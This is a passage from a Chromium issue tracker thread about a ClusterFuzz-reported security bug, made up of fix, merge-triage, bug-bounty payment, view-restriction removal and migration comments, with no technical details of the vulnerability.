See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### ea...@chromium.org (2016-02-23)

Marking as fixed as per clusterfuzz.

### ti...@google.com (2016-02-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-10)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ti...@google.com (2016-04-22)

Congrats - $3,000 for this report. I'll start the payment process today.

### ti...@google.com (2016-04-22)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/586266?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083678)*
